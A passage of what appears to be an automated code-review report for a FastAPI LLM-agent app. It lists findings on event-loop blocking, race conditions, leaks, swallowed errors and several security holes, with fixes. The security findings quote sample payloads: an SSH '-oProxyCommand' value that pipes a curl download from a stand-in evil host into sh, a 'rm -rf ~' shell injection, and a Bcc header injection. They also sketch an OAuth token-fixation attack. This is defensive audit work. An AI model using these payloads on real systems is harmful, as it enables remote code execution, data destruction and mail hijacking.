detail: In ollama_native_install (lines 339 and 382) and ollama_models (line 275), `await asyncio.wait_for(proc.communicate(), timeout=N)` is used with no cleanup on timeout. wait_for cancels the communicate() task but does NOT terminate the subprocess. Failure scenario: the Homebrew/curl|sh installer stalls past 300s/120s — the handler returns {"ok": false, "error": "Install timed out"} while the installer keeps running orphaned on the host, possibly finishing later or holding locks (brew lock, dpkg lock), and its stdout/stderr PIPEs are no longer drained so once the child fills the ~64KB pipe buffer it blocks forever as a permanent zombie-like process. Same for a hung `ollama list` at line 275 (5s timeout). Repeated invocations accumulate stuck processes.
fix: In each `except TimeoutError` (and as a safety net in `except Exception`) call `proc.kill()` then `await proc.wait()` before returning, e.g.: `except TimeoutError: proc.kill(); await proc.wait(); return {...}`.

title: Blocking urllib.request.urlopen inside async handler blocks the event loop
detail: `async def ollama_models` calls synchronous `urllib.request.urlopen(url, timeout=2)` in a loop over 3 URLs (lines 285-299). This runs on the event loop thread. Failure scenario: on a machine without the `ollama` CLI (the common Docker deployment), every call to GET /api/ollama/models synchronously attempts 127.0.0.1, localhost, then host.docker.internal; unreachable/filtered hosts consume up to the full 2s timeout each, freezing the entire FastAPI event loop for up to ~6s — all other requests (chat streaming, health checks) stall. This endpoint is the kind the frontend polls, so the stall is recurring.
fix: Replace with `httpx.AsyncClient` (already a dependency): `async with httpx.AsyncClient(timeout=2) as c: r = await c.get(url)`, or wrap the existing loop in `await asyncio.to_thread(...)`.

title: proc.wait() with PIPE stdout/stderr and no timeout — documented asyncio deadlock pattern
detail: In ollama_pull's local path, `create_subprocess_shell(..., stdout=PIPE, stderr=PIPE)` is followed by `await proc.wait()` (line 223) without draining the pipes and without a timeout, then stderr is read only after exit (line 226). The asyncio docs explicitly warn that wait() can deadlock when using PIPEs. Failure scenario: if `tmux new-session` emits more than the OS pipe buffer (~64KB) — e.g. a corrupted tmux server socket producing repeated error output, or verbose tmux config — the child blocks writing, wait() never returns, and the POST /api/ollama/pull request hangs forever holding the connection. There is also no timeout guard at all on this await.
fix: Use `out, err = await asyncio.wait_for(proc.communicate(), timeout=15)` instead of proc.wait(), and kill the process in the timeout handler.

title: Runner scripts and pull logs accumulate in TMUX_LOG_DIR forever
detail: Every local pull writes `{session_id}.sh` (line 213/215) and appends a `{session_id}.log` via tee; the session_id embeds a fresh uuid, so names never collide and nothing in this file ever deletes them. Failure scenario: `ollama pull` progress output is a stream of carriage-return progress updates that, captured through `tee` to a log file, can produce multi-MB logs per pull; a long-lived deployment doing periodic pulls/retries accumulates unbounded disk usage in TMUX_LOG_DIR until the volume fills.
fix: Delete runner_path after the tmux session is created (the shell has already read it, or copy semantics via `bash script` allow immediate unlink), and add cleanup/rotation for `ollama-pull-*.log` files (e.g. delete on completion detection, or prune files older than N days at startup).

title: _ollama_api_pull is dead code contradicted by its own test, and swallows all errors as 'unreachable'
detail: Two related problems. (1) tests/test_ollama_cookbook_routes.py:107 asserts `asyncio.to_thread(_ollama_api_pull` appears in this file, but the function is defined (line 32) and never called — the pull route uses the tmux/CLI path instead. Either the route silently regressed from the intended HTTP-API implementation or the test suite fails; either way the file and its contract have drifted. (2) Inside the function, `except Exception: continue` (line 62) treats every failure — including HTTP 404/500 from a reachable Ollama server (no `resp.raise_for_status()` is done) and Ollama's streamed {"error": ...} lines — as if the host were unreachable, so a user pulling a nonexistent model gets 'Ollama API unreachable' or 'pull did not complete' with the server's actual error message discarded. Note the function is sync httpx with an 1800s timeout: if it is ever wired back in without asyncio.to_thread, it will block the event loop for up to 30 minutes.
fix: Either wire it in as the test demands (`await asyncio.to_thread(_ollama_api_pull, model)`) or delete function and test. In the function: call `resp.raise_for_status()`, surface `data.get("error")` lines in the returned detail, and narrow `except Exception` to log/propagate non-connect errors instead of `continue`.

title: Blocking synchronous web search executed on the event loop in fallback path
detail: _handle_research_failure() calls comprehensive_web_search(query) — a fully synchronous function (services/search/core.py:250) that performs network searches and page fetches, blocking on ThreadPoolExecutor/as_completed. It is invoked from the async coroutine chain: call_research_service (async, line 853) -> _fallback_research (async, line 876) -> _handle_research_failure (line 943). Failure scenario: DeepResearcher throws (bad endpoint, search provider down), the fallback fires, and the entire asyncio event loop freezes for the duration of the multi-page search (easily 10-60s with slow sites) — every other HTTP request, SSE stream, and background research task in the process stalls. This runs precisely when the system is already degraded, amplifying the outage.
fix: Make _handle_research_failure async and run the search off-loop: `search_result = await asyncio.to_thread(comprehensive_web_search, query)`; await it from _fallback_research and call_research_service.

title: get_status() rescans and re-parses every research JSON on disk on each poll
detail: get_status() calls get_avg_duration() (line 542-560), which globs RESEARCH_DATA_DIR and json.loads every *.json file, synchronously, on the event loop (callers are async routes: routes/research_routes.py:168 research_status, and the SSE poll loop in research_stream at routes/research_routes.py:479 hits it once per tick). Research JSONs are never deleted — clear_result (line 562) deliberately keeps them, and each file contains full reports plus raw_findings (can be MBs). Failure scenario: after a few hundred completed researches, every status poll / every SSE tick performs hundreds of full-file reads and JSON parses on the event loop; status endpoints degrade to hundreds of ms each and stall all other requests, getting monotonically worse forever.
fix: Compute the average lazily with a cached value + TTL (e.g. recompute at most once per 60s), or maintain a running (count, sum) aggregate updated in _save_result; store only started_at/completed_at needed for the stat, and do any disk scan via asyncio.to_thread.

title: _active_tasks entries retain full DeepResearcher objects indefinitely (unbounded memory growth)
detail: Every start_research() inserts an entry holding the DeepResearcher instance (all findings, extracted page evidence, evolving report — potentially many MB per run), the asyncio Task, and the full result string (lines 292, 330, 389, 828). The only eviction is clear_result(), which fires solely when a client successfully fetches the result (routes/research_routes.py:191, routes/chat_routes.py:1180). Failure scenario: user starts research and closes the tab, the run is cancelled (line 438 leaves the entry in place), errors out, or the SSE consumer never returns to collect — the entry with its researcher lives for the life of the process. On a long-running server with periodic/scheduled research, RSS grows without bound until OOM.
fix: In _run(), add a finally that (after _save_result) nulls the heavy refs: entry['researcher'] = None; entry['task'] = None (disk JSON already has sources/raw_findings). Additionally evict terminal-status entries older than a TTL (e.g. sweep in start_research or a periodic task), since get_* methods already fall back to disk.

title: Synchronous multi-MB JSON serialization and file writes on the event loop
detail: _save_result() does json.dumps of the full result + raw_report + raw_findings and path.write_text() synchronously, and it is called from the async _run() coroutine (lines 332, 352, 376). Likewise the disk-fallback reads in get_result/get_sources/get_raw_findings/get_status/get_report_html (lines 412, 453, 477, 496, 643) do path.read_text + json.loads on the loop, invoked directly from async routes (e.g. routes/research_routes.py:188, 217). Failure scenario: a research run producing a 5-10 MB findings payload blocks the event loop for the serialize+write (tens to hundreds of ms, worse on slow disks), causing visible latency spikes and SSE stutter for all concurrent users each time any research completes or a report is viewed.
fix: Wrap disk persistence and loads in asyncio.to_thread (make _save_result async, or schedule it via to_thread from _run); for the sync accessors called from async routes, add async variants that off-load the read.

title: Non-atomic JSON writes plus swallow-all readers can silently lose completed research
detail: All persistence uses path.write_text() in place (lines 575, 609, 673, 690) — a crash, OOM-kill, or disk-full mid-write leaves a truncated/corrupt JSON file. Every reader then swallows the parse error with bare `except Exception: pass` (lines 421-422, 457-458, 479-480, 576-577, 627-628), returning None. Failure scenario: process is killed while _save_result is writing a finished report; on restart get_result/get_status return None, the route responds 404 'No research result available', and hours of research silently vanish with nothing above debug level in the logs. Same pattern in clear_result (line 576): if the rewrite fails, the 'consumed' flag is silently dropped and the result is re-delivered/re-rendered on every refresh.
fix: Write atomically: dump to a NamedTemporaryFile in RESEARCH_DATA_DIR then os.replace(tmp, path) (apply to _save_result, clear_result, hide_image, unhide_all_images). Replace the bare `except Exception: pass` blocks with `logger.warning(..., exc_info=True)` so corrupt files are diagnosable.

title: Sync SQLAlchemy query executed directly in async handler fire_reminder
detail: fire_reminder is 'async def' (runs on the event loop, not FastAPI's threadpool) but at lines 831-840 it opens SessionLocal() and runs a synchronous SQLite query. Every non-test reminder fire blocks the entire event loop for the duration of the query, and under SQLite lock contention (another writer holding the DB) that can be hundreds of ms to seconds, during which ALL requests to the app stall. The sibling CRUD routes correctly use sync 'def' and get threadpool dispatch; this one does not.
fix: Wrap the DB lookup in await asyncio.to_thread(...) (as done for _smtp_send at line 387), or make the DB portion a small sync helper called via to_thread, or convert fire_reminder to a sync 'def' route and call dispatch_reminder via anyio from a thread — simplest: fetch note fields inside 'await asyncio.to_thread(_load_note_fields, note_id, caller)'.

title: reorder_notes: N+1 sync queries in a loop inside an async handler, with unbounded client-supplied list
detail: reorder_notes is 'async def' but performs one synchronous SELECT per id (line 871-880) plus a commit, all on the event loop. The 'ids' list comes straight from the request body with no length cap, so a request with 100k ids issues 100k blocking SELECTs on the event loop — the whole server is unresponsive for the duration (an easy DoS for any authenticated user, and even legitimate large boards pay O(n) round-trips instead of one query).
fix: Cap len(ids) (e.g. 1000 -> 400 error), fetch all matching notes in one query: notes = db.query(Note).filter(Note.id.in_(ids), Note.owner == user).all(), assign sort_order from a {id: index} map, commit once — and run the DB work via await asyncio.to_thread(...) or make the route sync 'def'.

title: dispatch_reminder blocks the event loop with sync file and DB I/O
detail: dispatch_reminder is async (called from async routes and background tasks) but does synchronous I/O on the loop: load_settings() at 161 (file read), cache_path.read_text() at 177, the SMTP-fallback DB scan at 314-327 (SessionLocal + query over EmailAccount rows), _get_email_config() calls at 309/322 (per-row config load — itself N+1 across accounts), load_integrations() at 399/467 (file read), and _STATE.write_text() at 539. The SMTP send is correctly offloaded via to_thread (387), but the fallback account scan alone can hold the loop while iterating accounts and decrypting configs; every reminder fire freezes concurrent requests for that time.
fix: Move the whole email-config resolution block (lines 300-331) and the cache read/write into small sync helpers executed with await asyncio.to_thread(...). For the account fallback, load all candidate rows in one query and stop calling _get_email_config per row until a candidate passes cheap checks.

title: Dedupe cache is check-then-act across long awaits — duplicate reminder emails and lost cache updates
detail: The dedupe read happens at line 177-202, but the corresponding write happens at 518-539 only after awaiting the LLM synthesis (up to 30s, line 216-223) and the SMTP send. The file itself documents the exact race it is meant to prevent (frontend fire + background ping_notes scanner within minutes, comment at 513-517): if the scanner fires while the frontend-triggered dispatch is still awaiting the LLM, both pass the dedupe check and the user gets two emails. Additionally the read-modify-write at 531-539 is a lost-update race: two concurrent dispatches for different notes each read the file, and the second write_text clobbers the first one's entry, silently re-opening dedupe for that note. write_text is also non-atomic (no tmp+rename), so a crash mid-write corrupts the JSON, which the swallow at 203/531-533 turns into a silently reset dedupe state.
fix: Write the dedupe entry (with a 'pending' marker) immediately after the check passes, before any await; guard the read-modify-write with an asyncio.Lock (per-process) plus file locking (fcntl.flock / portalocker) for cross-process safety; write via tempfile + os.replace for atomicity.

title: Email header injection via note title in reminder Subject
detail: msg["Subject"] = f"Reminder (Atenea): {_t}" uses the note title. _reminder_text_from_note only .strip()s the title (line 102), so interior CR/LF survive. Notes are created not only by the user but by agents/LLM sessions (source/session_id fields) and via the API, so a title like 'buy milk\nBcc: attacker@evil.com' injects headers into the outgoing SMTP message under compat32 serialization (msg.as_string() at 384 does not reject embedded newlines), enabling Bcc/extra-recipient injection through the user's configured SMTP account.
fix: Sanitize before use: _t = ' '.join(_t.splitlines()) (and same for from/recipient values), or build the message with email.message.EmailMessage under the default (non-compat32) policy which raises on invalid header values.

title: toggle_item 500s on malformed or non-dict checklist items
detail: json.loads(note.items) at 785 is not guarded (unlike _note_to_dict at 64-67), and items[index]["done"] at 788 assumes every element is a dict. update_note (line 684) and create_note (629) accept any JSON list — 'items': ["just a string"] is valid input. Toggling such an item raises TypeError ('str' object does not support item assignment) -> unhandled 500 instead of a 400, and a row with corrupt JSON makes the endpoint permanently 500 for that note.
fix: Wrap json.loads in try/except -> HTTPException(400, 'Corrupt checklist data'); after the index check, verify isinstance(items[index], dict) else raise HTTPException(400, 'Item is not a checklist entry').

title: Note CRUD routes skip the codebase's require_user defense-in-depth gate
detail: All CRUD handlers (list_notes 592, create 620, get 650, update 667, delete 715, pin 734, archive 753, toggle_item 772, reorder 851) use _owner()/get_current_user, which returns None whenever the middleware didn't stamp a user. src/auth/helpers.require_user's docstring explicitly says 'Use this on routes that touch user data so middleware misconfig can't open them up' — and fire_reminder (807) follows that rule while the CRUD routes don't. If the auth middleware is bypassed or misconfigured (the SSRF-from-sibling-service scenario the helper documents), user is None and every filter branch 'if user is not None' is skipped: list_notes returns ALL users' notes and delete_note deletes any note by id.
fix: Call require_user(request) at the top of each note handler (as fire_reminder already does) so a bypassed middleware yields 401 instead of unscoped access; keep the user-is-None branches only for the legitimate '' single-user return value.

title: OAuth client_secret written to application logs
detail: `logger.info(f"MCP add_server: oauth_file={oauth_file!r}")` logs the raw `oauth_file` form field. That field is a JSON blob that (per lines 206-207) contains `client_id` and `client_secret` for the Google OAuth app. Every time an admin registers a Gmail-style MCP server, the Google client secret is persisted verbatim to whatever sink the `logging` config ships to (files, journald, log aggregators), where it outlives the credential file's filesystem permissions and is readable by anyone with log access.
fix: Log only non-sensitive metadata, e.g. `logger.info("MCP add_server: oauth_file provided=%s", bool(oauth_file))`, or log the parsed dict with `client_secret`/`client_id` redacted.

title: Blocking DB and file I/O inside async def handlers stalls the event loop
detail: Multiple `async def` handlers run synchronous SQLAlchemy sessions and synchronous file I/O directly on the event loop: add_server (SessionLocal/commit at 232-248 and `open(filepath,"w")`+json.dump at 223-224), reconnect_server (285), toggle_server (321), delete_server (354), update_disabled_tools (402), and _exchange_and_connect (SessionLocal at 519, `open(keys_file)` at 533, `open(token_file,"w")` at 563). Because these are `async def`, FastAPI runs them on the event loop thread, so a slow SQLite commit (e.g. while another writer holds the SQLite lock, or on a slow disk) freezes every other request in the process, including streaming agent responses. The sync `def` routes in this file (list_servers, list_tools) are fine because FastAPI threadpools them; the async ones are not.
fix: Wrap the DB blocks and file reads/writes in `await starlette.concurrency.run_in_threadpool(...)` (or `asyncio.to_thread`), or restructure each handler so the synchronous DB/file work happens in a plain helper function called via the threadpool, keeping only the `await mcp_manager.*` calls on the loop.

title: Legacy Google OAuth callback has no CSRF/state validation (token fixation)
detail: In the legacy Google flow, `state` is just the raw server_id (set at line 459, consumed at 488-489) — it is predictable (8 hex chars shown in the UI) and never bound to the initiating session. An attacker can start a Google consent flow with their own account, capture the resulting `code`, and lure a logged-in admin to GET `/api/mcp/oauth/callback?code=<attacker_code>&state=<server_id>`. `require_admin` passes because the victim's cookie is sent on the cross-site top-level GET, the code is exchanged, and the attacker's tokens are written over `token_file` (line 563). The Gmail MCP server then silently operates against the attacker's mailbox — outbound agent email/data flows into an attacker-controlled account — or at minimum valid tokens are destroyed.
fix: Generate a cryptographically random `state` per authorize request, store state -> server_id server-side (with expiry), and in the callback reject any `state` not previously issued; delete it after one use.

title: DB session held open across slow awaits (connect_server, token exchange)
detail: reconnect_server (295), toggle_server (334), delete_server (360) and _exchange_and_connect (541-578) keep the SessionLocal session — and its pooled SQLite connection — checked out across `await mcp_manager.connect_server(...)` and an external HTTPS POST to Google. connect_server for a stdio transport spawns a subprocess and completes an MCP handshake, which can take many seconds or hang until timeout. A handful of concurrent reconnects therefore pins that many pool connections for the full duration, exhausting the pool (default QueuePool size 5) so unrelated requests block in `SessionLocal()` waiting for a connection.
fix: Read all needed columns (name, transport, command, args, env, url) into locals, `db.close()` (or exit the try/finally) before any `await`, and open a fresh short-lived session afterwards if a post-await write is needed (delete_server should delete/commit before disconnecting, or reopen a session).

title: Swallowed JSON parse errors silently misconfigure servers and re-enable disabled tools
detail: add_server silently replaces malformed client input with defaults: invalid `args` -> [] (181-182), invalid `env` -> {} (185-186), and invalid `oauth_config` -> None via bare `pass` (193-196). The server is persisted misconfigured and the endpoint returns success, so an admin who pastes slightly-broken JSON gets a server with no OAuth config that later fails with an unrelated "needs_oauth"/connect error and no hint why. Worse, `_load_disabled_map` (104-105) silently `pass`es on corrupt `disabled_tools` JSON, meaning tools an admin explicitly disabled become enabled again with no log line — a silent policy failure consumed by `list_tools`/`get_all_tools`.
fix: In add_server, raise HTTPException(400, "invalid JSON in <field>") instead of substituting defaults for args/env/oauth_config. In _load_disabled_map, replace `pass` with `logger.warning("Corrupt disabled_tools for server %s; treating all tools as enabled", srv.id)` — or fail closed by disabling all tools for that server.

title: Non-atomic user rename can permanently orphan all of a user's data
detail: rename_user() (lines 299-342) commits the owner-column rename across every SQLAlchemy model (db.commit() at line 313) and renames the JSON prefs key (line 336) BEFORE calling auth_manager.rename_user() at line 340. auth_manager.rename_user() can still legitimately fail after those commits: core/auth.py line 283 rejects new usernames in RESERVED_USERNAMES, and it re-checks admin status and username collisions under its own lock. The route only pre-checks 'not in auth_manager.users' (line 293), not the reserved list. Concrete failure: admin renames 'bob' to a reserved name (or a concurrent request creates the target user between line 293 and line 340). The DB commit has already rewritten every owner row from 'bob' to the new name, then line 340 returns False and the route raises 400 'Cannot rename user' — the auth account is still 'bob', but all of bob's sessions, docs, tasks, and API-token rows now belong to a nonexistent owner. There is no rollback; the data is permanently inaccessible to the account.
fix: Validate the rename fully before touching data: expose/perform auth_manager's checks (reserved names, collision, admin) first — e.g. call auth_manager.rename_user() BEFORE the DB owner-rename, and if the subsequent DB update fails, run a compensating rename back (or restructure so the auth rename and DB update happen under one guard with a compensating rollback on failure).

title: Blocking bcrypt password hashing/verification runs directly on the event loop
detail: admin_create_user (line 264) calls auth_manager.create_user() directly inside an async def; create_user runs bcrypt.hashpw (core/auth.py line 70), which costs ~100-300 ms of pure CPU. Likewise totp_disable (line 237) calls auth_manager.totp_disable(), which runs bcrypt.checkpw via verify_password (core/auth.py lines 432, 74). Both block the single asyncio event loop for the full bcrypt duration, stalling EVERY concurrent request on the server (SSE streams, chat, health checks). The sibling endpoints already do this correctly — setup (line 98), signup (line 116), login (line 127/137), and change_password (line 184) all use asyncio.to_thread — so these two are regressions/inconsistencies. Failure scenario: an admin creates a few users in quick succession while other users are chatting; each request freezes the whole app for hundreds of milliseconds.
fix: Line 264: `ok = await asyncio.to_thread(auth_manager.create_user, body.username, body.password, body.is_admin)`. Line 237: `if not await asyncio.to_thread(auth_manager.totp_disable, user, body.password):`.

title: Synchronous SQLAlchemy bulk UPDATE over every mapped table inside async handler
detail: rename_user() opens a sync SessionLocal (line 302) inside an async def and, in a loop over ALL mappers (lines 304-312), issues an UPDATE ... WHERE lower(owner) = :old per table, then commits — all on the event loop thread. The func.lower(model.owner) predicate defeats any index on owner, forcing a full table scan of every owner-bearing table (chat sessions, messages, docs, tasks...). On a SQLite DB of realistic size this blocks the event loop for seconds, during which the entire app is frozen; SQLite write locking can extend this further if a background writer holds the lock. (The session itself is correctly closed in the finally at line 318 — no leak, purely a blocking problem.)
fix: Move the whole DB block into a sync helper and run it via `await asyncio.to_thread(...)`. Additionally, since usernames are already normalized to lowercase on creation (core/auth.py strips/lowers), filter with `model.owner == old_username` (or normalize once with a one-time migration) so the UPDATE can use an index.

title: Sync file I/O and CPU-bound QR generation inside async handlers
detail: Multiple async handlers perform blocking work directly on the event loop: (a) totp_setup lines 208-211 does CPU-bound QR PNG generation (qrcode.make + PIL save); (b) get_features/set_features (lines 414, 423, 427), get_settings/set_settings (lines 438, 450, 469), and all integrations routes (lines 483, 500, 510, 521, 532, 556) call sync JSON file read/write helpers — load_integrations additionally does Fernet decryption and may rewrite the file on load (registry.py line 218), and add/update/delete each re-read and atomically rewrite the whole file with chmod. Each call blocks the loop for one-to-tens of milliseconds; on slow disks (network volumes, SD cards on self-hosted boxes) file writes can take far longer, stalling all concurrent requests. Lower severity than the bcrypt case because typical latency is small, but it is the same class of defect in the hot admin/settings path.
fix: Wrap the blocking bodies in asyncio.to_thread, e.g. `qr_b64 = await asyncio.to_thread(_make_qr_b64, uri)` and `current = await asyncio.to_thread(_load_settings)` / `await asyncio.to_thread(_save_settings, current)` (same for features and integration registry calls).

title: Swallowed exceptions hide privilege-lookup and cache-invalidation failures
detail: Two bare `except Exception: pass` blocks discard failures silently. (1) Lines 168-173 in /status: if auth_manager.get_privileges() raises (corrupt auth.json entry, unexpected type), the response simply omits 'privileges' — the frontend then hides/dims features for a user who actually has them, with zero log trail to diagnose. (2) Lines 391-396 in admin_delete_user: if the token-cache invalidator raises, the exception is swallowed, and per the code's own comment the deleted user's cached bearer token KEEPS AUTHENTICATING until some other token operation or restart — a silent security-relevant failure. Note the rename route calls the same invalidator (lines 348-350) with no try/except at all, so the two paths are inconsistent about whether invalidator errors are fatal.
fix: Replace both `pass` bodies with `logger.warning("...: %s", e, exc_info=True)` so failures are visible; for the delete path, consider letting the exception propagate (or return ok:False detail) since a stale auth cache after user deletion is a security condition, not a cosmetic one.

title: Non-atomic read-modify-write on integrations file allows lost updates
detail: add_integration (lines 260-262), update_integration (268-273), and delete_integration (280-284) each do load_integrations() -> mutate list -> save_integrations() with no file lock or in-process lock. With FastAPI sync routes running in the threadpool, or multiple uvicorn workers, two concurrent adds both read the same list and the second save silently drops the first's new integration. Worse, load_integrations() itself performs a write when it sees a plaintext key (lines 217-218), so a mere read racing a delete_integration can resurrect the deleted entry.
fix: Serialize all access to DATA_FILE: guard load/save read-modify-write sequences with a module-level threading.Lock (sufficient for single-process) or an OS-level file lock (fcntl.flock / portalocker) for multi-worker deployments, holding it across the full load-mutate-save cycle.

title: Whole HTTP response buffered in memory before 12KB truncation
detail: execute_api_call reads the entire upstream body via response.json()/response.text (lines 410-419) and only truncates to 12,000 chars afterwards (line 422). There is no size cap on the download, so an agent-issued call to e.g. Gitea's contents endpoint on a large blob, or any server that streams an arbitrarily large body, buffers the full payload in process memory (plus a regex pass over it for text/html), enabling memory exhaustion of the server.
fix: Use client.stream(...) and read at most ~64KB (aiter_bytes with a running byte counter), or check the Content-Length header and abort when it exceeds the cap, before decoding/formatting; then truncate.

title: Blocking file I/O (and possible file write) inside async execute_api_call
detail: execute_api_call is async but line 325 calls _find_integration -> load_integrations, which does synchronous open()/json.load, per-key decryption, and can even trigger a synchronous save_integrations (atomic file write + chmod, lines 217-218) when a plaintext key is found. All of this runs on the event loop, stalling every other in-flight coroutine for the duration of disk I/O.
fix: Run the lookup off the loop, e.g. integration = await asyncio.to_thread(_find_integration, integration_id) (or via anyio.to_thread.run_sync), keeping the store's lock from finding #1.

title: migrate_from_settings rewrites settings.json non-atomically
detail: Lines 506-507 write settings.json with plain open(path, 'w') + json.dump, although the codebase already has core.atomic_io.atomic_write_json (used for the integrations file). A crash or full disk mid-write leaves settings.json truncated/corrupted, and any settings changes made by another writer between the read at line 479 and this write are silently clobbered.
fix: Replace the open/json.dump with atomic_write_json(settings_path, settings, indent=2), and perform the read-modify-write under the same lock/mechanism other settings writers use.

title: get_integrations_prompt crashes on integration entry missing 'id'
detail: Line 458 uses integ['id'] unguarded while line 457 already anticipates a missing id (integ.get('id', 'unknown')). A hand-edited or legacy integrations.json entry without an 'id' key raises KeyError, aborting system-prompt construction for all integrations and breaking the agent's api_call capability entirely.
fix: Use integ.get('id', 'unknown') on line 458 (or skip/repair entries lacking an id during load_integrations).

title: SSH option-argument injection via unvalidated remote host
detail: _ssh_exec_argv() appends the caller-supplied `remote` string directly to the ssh argv with no `--` end-of-options separator and no validation. OpenSSH parses any argv element starting with '-' as an option, so a remote value like "-oProxyCommand=curl http://evil/x.sh|sh" (or -oLocalCommand/-oPermitLocalCommand) causes ssh to execute an arbitrary LOCAL command on the Atenea host. In this LLM-agent app the remote host string typically originates from user- or agent-supplied remote-GPU/SSH configuration, making this reachable local command execution. `ssh_port` is also passed through as a raw string via str(ssh_port) rather than being validated as an integer.
fix: Insert "--" before the remote: argv.append("--"); argv.append(remote). Additionally reject remotes matching ^- (raise ValueError) and validate ssh_port with int(ssh_port) (1-65535) before building the argv.

title: find_bash() sets _BASH_PROBED before populating _BASH_CACHE (check-then-act race)
detail: The module-level cache uses two globals with no lock, and _BASH_PROBED = True is assigned at line 241 BEFORE the probe runs and before _BASH_CACHE is written at line 250. Under FastAPI's threadpool, a second thread calling find_bash()/has_bash() while the first thread is mid-probe (which_tool + os.path.exists over several filesystem paths) sees _BASH_PROBED == True and returns the stale _BASH_CACHE = None. Consequence: has_bash() returns False and run_script_argv() silently falls back to `cmd.exe /c` (Windows) or `sh`, so a bash-syntax agent script fails or misbehaves for that request even though bash is installed.
fix: Assign _BASH_CACHE before flipping _BASH_PROBED (write found first, flag last), or better, replace the two globals with a threading.Lock-guarded probe or functools.lru_cache(maxsize=1) on a _probe_bash() helper so the flag and value are set atomically.

title: kill_process_tree() can SIGTERM the server's own process group
detail: os.killpg(os.getpgid(pid), SIGTERM) signals whatever process group `pid` belongs to, without verifying pid is a group leader (the docstring claims a fallback for that case, but the code only falls back when killpg raises). If any caller passes the pid of a child spawned WITHOUT detached_popen_kwargs()/start_new_session=True, getpgid(pid) returns the FastAPI server's own process group id, and the SIGTERM is delivered to the entire app -- the web server kills itself while trying to clean up one child.
fix: Guard against signalling our own group: pgid = os.getpgid(pid); if pgid == os.getpgid(0): os.kill(pid, signal.SIGTERM) else: os.killpg(pgid, signal.SIGTERM). Keep the existing plain-kill fallback for ProcessLookupError/PermissionError.

title: pid_alive() returns False for a live process on PermissionError (POSIX)
detail: On POSIX, os.kill(pid, 0) raises PermissionError (EPERM, a subclass of OSError) when the target process EXISTS but is owned by another user. The blanket `except (OSError, ProcessLookupError): return False` therefore reports a live process as dead. Any caller using this for liveness gating (e.g. "background job died, respawn it", or "pid is free, safe to reuse recorded pid") will double-spawn workers or misreport job state whenever the tracked process runs under a different uid (setuid helpers, processes surviving a privilege change, containers sharing a pid namespace).
fix: Handle EPERM as alive: except ProcessLookupError: return False / except PermissionError: return True / except OSError: return False.

title: taskkill subprocess.run has no timeout and swallows all errors
detail: The Windows branch of kill_process_tree() calls subprocess.run(["taskkill", ...]) with no timeout=. taskkill can hang indefinitely (wedged RPC/Service Control interactions, unkillable process in device-driver wait), which blocks the calling thread forever -- typically a request-teardown or job-cleanup thread, which then leaks along with the child process it was supposed to reap. The surrounding `except Exception: pass` also hides taskkill being absent or failing, so callers can never learn the tree was not killed.
fix: Pass timeout=10 to subprocess.run and catch subprocess.TimeoutExpired explicitly; at minimum log (debug level) on nonzero returncode or exception instead of a bare pass.

title: is_wsl() performs uncached file I/O on every call
detail: is_wsl() opens and reads /proc/version on every invocation, and it is called from translate_path(), which is the kind of helper invoked per-path in hot loops (path translation for every file the agent touches) and also from get_wsl_windows_user_profile()/run_wsl_windows_powershell(). WSL status cannot change during process lifetime, so this is repeated blocking syscall work (open/read/close plus a regex import) for a constant answer; under load, per-request threadpool handlers pay it repeatedly.
fix: Cache the result: decorate is_wsl with @functools.lru_cache(maxsize=None) (or compute a module-level IS_WSL constant at import time alongside IS_WINDOWS/IS_POSIX), and hoist the `import re` in translate_path to module level.

title: Codex email send always runs synchronously in the event loop with a throwaway BackgroundTasks
detail: codex_email_send calls email_send_endpoint(req=req, background_tasks=BackgroundTasks(), owner=owner) with a freshly constructed BackgroundTasks() that is NOT the one FastAPI attaches to the response. In email_routes.send_email, when req.wait_for_delivery is false the code does background_tasks.add_task(_deliver) and returns 'queued'. Because this BackgroundTasks instance is discarded (never awaited by FastAPI's response lifecycle), the _deliver task is NEVER executed: the Codex caller gets {'success': True, 'queued': True} but the email is silently never sent. Conversely, if a client passes wait_for_delivery=true, the blocking IMAP/SMTP _deliver runs via asyncio.to_thread (fine) but the queued path is broken. Failure scenario: agent POSTs /api/codex/emails/send without wait_for_delivery -> API reports success, mail never leaves the box.
fix: Accept BackgroundTasks as a real FastAPI parameter on codex_email_send (def codex_email_send(request, background_tasks: BackgroundTasks, body=...)) and pass that through, so FastAPI actually runs the queued delivery task after the response; or force req.wait_for_delivery=True before calling so delivery is awaited inline.

title: SSH host/port from cookbook state interpolated into a shell command without quoting
detail: In codex_cookbook_output (and identically in codex_cookbook_stop, line 568) the ssh command is built as f"ssh {port_flag}{host} {shlex.quote(inner)}" where host and ssh_port come from the cookbook state file task fields (remoteHost/sshPort) and are NOT shlex.quoted, then passed to asyncio.create_subprocess_shell (a real shell). Only session_id is regex-validated; host/ssh_port are interpolated raw. If the cookbook_state.json task's remoteHost contains shell metacharacters (e.g. 'boxA; rm -rf ~' or '$(...)'), arbitrary commands execute on the server host. cookbook/adopt (line 727) correctly shlex.quotes host, proving the pattern is known; output/stop are inconsistent. Failure scenario: a task adopted or written with a crafted remoteHost -> reading its output or stopping it runs injected shell code.
fix: shlex.quote(host) and validate/quote ssh_port (or build the argv list and use create_subprocess_exec instead of create_subprocess_shell), mirroring the quoting already done in codex_cookbook_adopt.

title: Timeout-killed subprocess is not awaited/reaped after proc.kill()
